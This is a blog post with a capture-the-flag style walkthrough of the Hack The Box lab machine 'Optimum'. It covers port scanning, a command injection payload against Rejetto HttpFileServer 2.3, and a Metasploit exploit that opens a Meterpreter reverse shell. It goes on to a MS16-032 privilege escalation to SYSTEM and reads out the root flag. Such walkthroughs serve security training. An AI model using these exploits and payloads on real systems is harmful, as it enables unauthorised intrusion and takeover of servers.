<!DOCTYPE html>
<html lang="en">
<head>
  
    <title>Optimum :: Research blog</title>
  
  <meta http-equiv="content-type" content="text/html; charset=utf-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<meta name="description" content="Steps Reconnaissance NMAP ┌──(kali㉿kali)-[~/Documents/hackthebox/optimum] └─$ nmap 10.10.10.8 -oN nmap.txt Starting Nmap 7.92 ( https://nmap.org ) at 2022-03-27 06:32 EDT Nmap scan report for 10.10.10.8 Host is up (0.087s latency). Not shown: 999 filtered tcp ports (no-response) PORT STATE SERVICE 80/tcp open http Nmap done: 1 IP address (1 host up) scanned in 7.86 seconds webserver Command injection    Linux Windows     whoami whoami   uname -a ver   ifconfig ipconfig /all   netstat -an netstat -an   ps -ef tasklist    Ways of injecting OS commands A variety of shell metacharacters can be used to perform OS command injection attacks." />
<meta name="keywords" content="" />
<meta name="robots" content="noodp" />
<link rel="canonical" href="https://thomas-byrne.co.uk/hackthebox/optimum-write-up/" />




<link rel="stylesheet" href="https://thomas-byrne.co.uk/assets/style.css">

  <link rel="stylesheet" href="https://thomas-byrne.co.uk/assets/green.css">






<link rel="apple-touch-icon-precomposed" sizes="144x144" href="https://thomas-byrne.co.uk/img/apple-touch-icon-144-precomposed.png">

  <link rel="shortcut icon" href="https://thomas-byrne.co.uk/img/favicon/green.png">



<meta name="twitter:card" content="summary" />



<meta property="og:locale" content="en" />
<meta property="og:type" content="article" />
<meta property="og:title" content="Optimum :: Research blog">
<meta property="og:description" content="Hack The Box machine" />
<meta property="og:url" content="https://thomas-byrne.co.uk/hackthebox/optimum-write-up/" />
<meta property="og:site_name" content="Optimum" />

  <meta property="og:image" content="https://thomas-byrne.co.uk">

<meta property="og:image:width" content="2048">
<meta property="og:image:height" content="1024">


  <meta property="article:published_time" content="2022-07-09 00:00:00 &#43;0000 UTC" />












</head>
<body class="green">


<div class="container center headings--one-size">

  <header class="header">
  <div class="header__inner">
    <div class="header__logo">
      <a href="/">
  <div class="logo">
    /home
  </div>
</a>

    </div>
    <div class="menu-trigger">menu</div>
  </div>
  
    <nav class="menu">
  <ul class="menu__inner menu__inner--desktop">
    
      
        
          <li><a href="/about">About</a></li>
        
      
        
          <li><a href="/hackthebox">HackTheBox</a></li>
        
      
      
        <ul class="menu__sub-inner">
          <li class="menu__sub-inner-more-trigger">Show more ▾</li>

          <ul class="menu__sub-inner-more hidden">
            
              
                <li><a href="/oscp">OSCP</a></li>
              
            
              
                <li><a href="/projects">Projects</a></li>
              
            
              
                <li><a href="/research">Research</a></li>
              
            
              
                <li><a href="/showcase">Showcase</a></li>
              
            
          </ul>
        </ul>
      
    

    
  </ul>

  <ul class="menu__inner menu__inner--mobile">
    
      
        <li><a href="/about">About</a></li>
      
    
      
        <li><a href="/hackthebox">HackTheBox</a></li>
      
    
      
        <li><a href="/oscp">OSCP</a></li>
      
    
      
        <li><a href="/projects">Projects</a></li>
      
    
      
        <li><a href="/research">Research</a></li>
      
    
      
        <li><a href="/showcase">Showcase</a></li>
      
    
    
  </ul>
</nav>

  
</header>


  <div class="content">
    
<div class="post">
  <h1 class="post-title">
    <a href="https://thomas-byrne.co.uk/hackthebox/optimum-write-up/">Optimum</a></h1>
  <div class="post-meta">
    
      <span class="post-date">
        2022-07-09 
      </span>
    
    
    <span class="post-author">:: Tom</span>
    
  </div>

  

  
    <img src="https://thomas-byrne.co.uk" class="post-cover" alt="Optimum" />
  

  

  <div class="post-content"><div>
        <h1 id="steps">Steps<a href="#steps" class="hanchor" ariaLabel="Anchor">&#8983;</a> </h1>
<h1 id="reconnaissance">Reconnaissance<a href="#reconnaissance" class="hanchor" ariaLabel="Anchor">&#8983;</a> </h1>
<h2 id="nmap">NMAP<a href="#nmap" class="hanchor" ariaLabel="Anchor">&#8983;</a> </h2>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">┌──<span style="color:#f92672">(</span>kali㉿kali<span style="color:#f92672">)</span>-<span style="color:#f92672">[</span>~/Documents/hackthebox/optimum<span style="color:#f92672">]</span>
└─$ nmap 10.10.10.8 -oN nmap.txt                    
Starting Nmap 7.92 <span style="color:#f92672">(</span> https://nmap.org <span style="color:#f92672">)</span> at 2022-03-27 06:32 EDT
Nmap scan report <span style="color:#66d9ef">for</span> 10.10.10.8
Host is up <span style="color:#f92672">(</span>0.087s latency<span style="color:#f92672">)</span>.
Not shown: <span style="color:#ae81ff">999</span> filtered tcp ports <span style="color:#f92672">(</span>no-response<span style="color:#f92672">)</span>
PORT   STATE SERVICE
80/tcp open  http

Nmap <span style="color:#66d9ef">done</span>: <span style="color:#ae81ff">1</span> IP address <span style="color:#f92672">(</span><span style="color:#ae81ff">1</span> host up<span style="color:#f92672">)</span> scanned in 7.86 seconds

</code></pre></div><h2 id="webserver">webserver<a href="#webserver" class="hanchor" ariaLabel="Anchor">&#8983;</a> </h2>
<h2 id="command-injection">Command injection<a href="#command-injection" class="hanchor" ariaLabel="Anchor">&#8983;</a> </h2>
<table>
<thead>
<tr>
<th>Linux</th>
<th>Windows</th>
</tr>
</thead>
<tbody>
<tr>
<td>whoami</td>
<td>whoami</td>
</tr>
<tr>
<td>uname -a</td>
<td>ver</td>
</tr>
<tr>
<td>ifconfig</td>
<td>ipconfig /all</td>
</tr>
<tr>
<td>netstat -an</td>
<td>netstat -an</td>
</tr>
<tr>
<td>ps -ef</td>
<td>tasklist</td>
</tr>
</tbody>
</table>
<h2 id="ways-of-injecting-os-commands">Ways of injecting OS commands<a href="#ways-of-injecting-os-commands" class="hanchor" ariaLabel="Anchor">&#8983;</a> </h2>
<p>A variety of shell metacharacters can be used to perform OS command injection attacks.</p>
<p>A number of characters function as command separators, allowing commands to be chained together. The following command separators work on both Windows and Unix-based systems:</p>
<ul>
<li><code>&amp;</code></li>
<li><code>&amp;&amp;</code></li>
<li><code>|</code></li>
<li><code>||</code></li>
</ul>
<h2 id="checking-if-theres-any-known-vulns">Checking if theres any known vulns<a href="#checking-if-theres-any-known-vulns" class="hanchor" ariaLabel="Anchor">&#8983;</a> </h2>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">┌──<span style="color:#f92672">(</span>kali㉿kali<span style="color:#f92672">)</span>-<span style="color:#f92672">[</span>~/Documents/hackthebox/optimum<span style="color:#f92672">]</span>
└─$ searchsploit http fileserver 2.3
--------------------------------------------------------------------------------------------------------- ---------------------------------
 Exploit Title                                                                                           |  Path
--------------------------------------------------------------------------------------------------------- ---------------------------------
Rejetto HttpFileServer 2.3.x - Remote Command Execution <span style="color:#f92672">(</span>3<span style="color:#f92672">)</span>                                              | windows/webapps/49125.py
--------------------------------------------------------------------------------------------------------- ---------------------------------
</code></pre></div><h2 id="payload">Payload<a href="#payload" class="hanchor" ariaLabel="Anchor">&#8983;</a> </h2>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">┌──<span style="color:#f92672">(</span>kali㉿kali<span style="color:#f92672">)</span>-<span style="color:#f92672">[</span>~/Documents/hackthebox/optimum<span style="color:#f92672">]</span>
└─$ python3 49125.py 10.10.10.8 <span style="color:#ae81ff">80</span> dir       
http://10.10.10.8:80/?search<span style="color:#f92672">=</span>%00<span style="color:#f92672">{</span>.+exec|dir.<span style="color:#f92672">}</span>

</code></pre></div><h2 id="foothold">Foothold<a href="#foothold" class="hanchor" ariaLabel="Anchor">&#8983;</a> </h2>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">msf6 exploit<span style="color:#f92672">(</span>windows/http/rejetto_hfs_exec<span style="color:#f92672">)</span> &gt; run

<span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Started reverse TCP handler on 10.10.16.91:4444 
<span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Using URL: http://0.0.0.0:8080/lQgohScReR
<span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Local IP: http://192.168.216.129:8080/lQgohScReR
<span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Server started.
<span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Sending a malicious request to /
<span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Payload request received: /lQgohScReR
<span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Sending stage <span style="color:#f92672">(</span><span style="color:#ae81ff">175174</span> bytes<span style="color:#f92672">)</span> to 10.10.10.8

<span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Meterpreter session <span style="color:#ae81ff">1</span> opened <span style="color:#f92672">(</span>10.10.16.91:4444 -&gt; 10.10.10.8:49162 <span style="color:#f92672">)</span> at 2022-03-27 11:09:55 -0400
<span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Server stopped.
<span style="color:#f92672">[</span>!<span style="color:#f92672">]</span> This exploit may require manual cleanup of <span style="color:#e6db74">&#39;%TEMP%\NlJAsyD.vbs&#39;</span> on the target

meterpreter &gt; 
meterpreter &gt; sysinfo
Computer        : OPTIMUM
OS              : Windows <span style="color:#ae81ff">2012</span> R2 <span style="color:#f92672">(</span>6.3 Build 9600<span style="color:#f92672">)</span>.
Architecture    : x64
System Language : el_GR
Domain          : HTB
Logged On Users : <span style="color:#ae81ff">1</span>
Meterpreter     : x86/windows

</code></pre></div><h1 id="priv-esc">Priv esc<a href="#priv-esc" class="hanchor" ariaLabel="Anchor">&#8983;</a> </h1>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">meterpreter &gt; sysinfo                                                                       
Computer        : OPTIMUM         
OS              : Windows <span style="color:#ae81ff">2012</span> R2 <span style="color:#f92672">(</span>6.3 Build 9600<span style="color:#f92672">)</span>.                                         
Architecture    : x64                         
System Language : el_GR                                                                                                                                                                 
Domain          : HTB                                                                                                                                                                   
Logged On Users : <span style="color:#ae81ff">1</span>                                                                                                                                                                     
Meterpreter     : x86/windows   
</code></pre></div><p>Grabbing the OS version for some basic enumeration discovered there is a local privilege escalation for this machine</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">──<span style="color:#f92672">(</span>kali㉿kali<span style="color:#f92672">)</span>-<span style="color:#f92672">[</span>~/Documents/hackthebox/optimum<span style="color:#f92672">]</span>
└─$ searchsploit Windows <span style="color:#ae81ff">2012</span> R2                                                                                                                                                    <span style="color:#ae81ff">1</span> ⨯

------------------------------------------------------------------------------------------------------------------------------------------------------ ---------------------------------
 Exploit Title                                                                                                                                        |  Path
------------------------------------------------------------------------------------------------------------------------------------------------------ ---------------------------------
Microsoft Windows <span style="color:#ae81ff">7</span> &lt; <span style="color:#ae81ff">10</span> / <span style="color:#ae81ff">2008</span> &lt; <span style="color:#ae81ff">2012</span> R2 <span style="color:#f92672">(</span>x86/x64<span style="color:#f92672">)</span> - Local Privilege Escalation <span style="color:#f92672">(</span>MS16-032<span style="color:#f92672">)</span> <span style="color:#f92672">(</span>PowerShell<span style="color:#f92672">)</span>                                              | windows/local/39719.ps1

<span style="color:#f92672">[</span>...SNIP...<span style="color:#f92672">]</span>
------------------------------------------------------------------------------------------------------------------------------------------------------ ---------------------------------
</code></pre></div><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">meterpreter &gt; bg
<span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Backgrounding session 7...
msf6 exploit<span style="color:#f92672">(</span>windows/http/rejetto_hfs_exec<span style="color:#f92672">)</span> &gt; search MS16-032

Matching Modules
<span style="color:#f92672">================</span>

   <span style="color:#75715e">#  Name                                                           Disclosure Date  Rank    Check  Description</span>
   -  ----                                                           ---------------  ----    -----  -----------
   <span style="color:#ae81ff">0</span>  exploit/windows/local/ms16_032_secondary_logon_handle_privesc  2016-03-21       normal  Yes    MS16-032 Secondary Logon Handle Privilege Escalation

</code></pre></div><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">meterpreter &gt; shell
Process <span style="color:#ae81ff">2816</span> created.
Channel <span style="color:#ae81ff">1</span> created.
Microsoft Windows <span style="color:#f92672">[</span>Version 6.3.9600<span style="color:#f92672">]</span>
<span style="color:#f92672">(</span>c<span style="color:#f92672">)</span> <span style="color:#ae81ff">2013</span> Microsoft Corporation. All rights reserved.


C:<span style="color:#ae81ff">\U</span>sers<span style="color:#ae81ff">\k</span>ostas<span style="color:#ae81ff">\D</span>esktop&gt;cd ../..
cd ../..

C:<span style="color:#ae81ff">\U</span>sers&gt;whoami
whoami
nt authority<span style="color:#ae81ff">\s</span>ystem

C:<span style="color:#ae81ff">\U</span>sers&gt;type administrator<span style="color:#ae81ff">\d</span>esktop<span style="color:#ae81ff">\r</span>oot.txt
type administrator<span style="color:#ae81ff">\d</span>esktop<span style="color:#ae81ff">\r</span>oot.txt
51ed1b36553c8461f4552c2e92b3eeed

</code></pre></div>
      </div></div>

  

  

</div>

  </div>

  
    <footer class="footer">
  <div class="footer__inner">
    
      <div class="copyright">
        <span>© 2022 Powered by <a href="http://gohugo.io">Hugo</a></span>
    
        <span>:: Theme made by <a href="https://twitter.com/panr">panr</a></span>
      </div>
  </div>
</footer>

<script src="https://thomas-byrne.co.uk/assets/main.js"></script>
<script src="https://thomas-byrne.co.uk/assets/prism.js"></script>





  
</div>

</body>
</html>
